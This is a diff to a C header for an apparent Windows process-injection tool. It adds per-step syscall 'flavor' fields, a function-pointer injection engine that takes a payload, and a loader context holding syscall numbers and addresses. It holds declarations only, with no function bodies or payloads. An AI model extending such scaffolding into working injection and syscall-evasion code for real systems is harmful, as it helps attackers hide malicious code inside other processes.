@@ -25,7 +25,6 @@ typedef enum _EBMETHOD {
 } EBMETHOD;
 
 
-// Shared pipeline state
 typedef struct _INJECTION_CONTEXT {
     BOOL   spawnTarget;
     char*  spawnPath;
@@ -39,6 +38,12 @@ typedef struct _INJECTION_CONTEXT {
     char*  targetExport;
     DWORD  targetOffset;
     PITECHNIQUE technique;
+
+    SYSCALL_FLAVOR allocFlavor;
+    SYSCALL_FLAVOR writeFlavor;
+    SYSCALL_FLAVOR protectFlavor;
+    SYSCALL_FLAVOR invokeFlavor;
+
 } INJECTION_CONTEXT, *PINJECTION_CONTEXT;
 
 // Function pointer signatures, currently unused
@@ -47,12 +52,12 @@ typedef BOOL(*FnWrite)(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR 
 typedef BOOL(*FnProtect)(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProtect, SYSCALL_FLAVOR flavor);
 typedef BOOL(*FnInvoke)(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor);
 
-typedef struct _INJECTION_ENGINE {
+/*typedef struct _INJECTION_ENGINE {
     FnAllocate Allocate;
     FnWrite    Write;
     FnProtect  Protect;
     FnInvoke   Invoke;    
-} INJECTION_ENGINE, *PINJECTION_ENGINE;
+} INJECTION_ENGINE, *PINJECTION_ENGINE;*/
 
 // DFR Definitions
 // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
@@ -62,6 +67,14 @@ typedef LPVOID(WINAPI* P_VirtualAllocEx)(
 	SIZE_T dwSize,
 	DWORD  flAllocationType,
 	DWORD  flProtect
+);
+
+// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
+typedef BOOL(WINAPI* P_VirtualProtect) (	
+	LPVOID lpAddress,
+	SIZE_T dwSize,
+	DWORD  flNewProtect,
+	PDWORD lpflOldProtect
 );
 
 // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
@@ -213,14 +226,6 @@ NTSTATUS SysNtWaitForSingleObject(
 }
 #endif
 
-// engine declarations
-BOOL InitializeResolvers(SYSCALL_FLAVOR flavor);
-BOOL DefaultAllocate(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavor);
-BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor);
-BOOL DefaultProtect(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProtect, SYSCALL_FLAVOR flavor);
-BOOL DefaultInvoke(PINJECTION_CONTEXT ctx,  SYSCALL_FLAVOR flavor);
-BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor, DWORD finalProtect);
-
 typedef struct _LOCAL_LOADER_CONTEXT {
     DWORD     wNtAllocateVirtualMemorySSN;
     DWORD     wNtProtectVirtualMemorySSN;
@@ -230,3 +235,27 @@ typedef struct _LOCAL_LOADER_CONTEXT {
     UINT_PTR sysAddrNtProtectVirtualMemory;
     UINT_PTR sysAddrNtWriteVirtualMemory;
 } LOCAL_LOADER_CONTEXT, *PLOCAL_LOADER_CONTEXT;
+
+typedef struct _INJECTION_ENGINE {
+    BOOL (*Allocate)(PINJECTION_CONTEXT, DWORD);
+    BOOL (*Write)(PINJECTION_CONTEXT, LPCVOID);
+    BOOL (*Protect)(PINJECTION_CONTEXT, DWORD, PDWORD);
+    BOOL (*Invoke)(PINJECTION_CONTEXT);
+} INJECTION_ENGINE;
+
+
+typedef INJECTION_ENGINE* PINJECTION_ENGINE;
+
+// engine declarations
+//BOOL InitializeResolvers(SYSCALL_FLAVOR flavor);
+BOOL InitializeResolvers(PINJECTION_CONTEXT ctx);
+BOOL DefaultAllocate(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavor);
+BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor);
+BOOL DefaultProtect(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProtect, SYSCALL_FLAVOR flavor);
+BOOL DefaultInvoke(PINJECTION_CONTEXT ctx,  SYSCALL_FLAVOR flavor);
+//BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor, DWORD finalProtect);
+BOOL EngineExecute(PINJECTION_ENGINE engine,
+                   PINJECTION_CONTEXT ctx,
+                   LPCVOID pPayload,
+                   DWORD finalProtect);
+char* flavorName(SYSCALL_FLAVOR f);
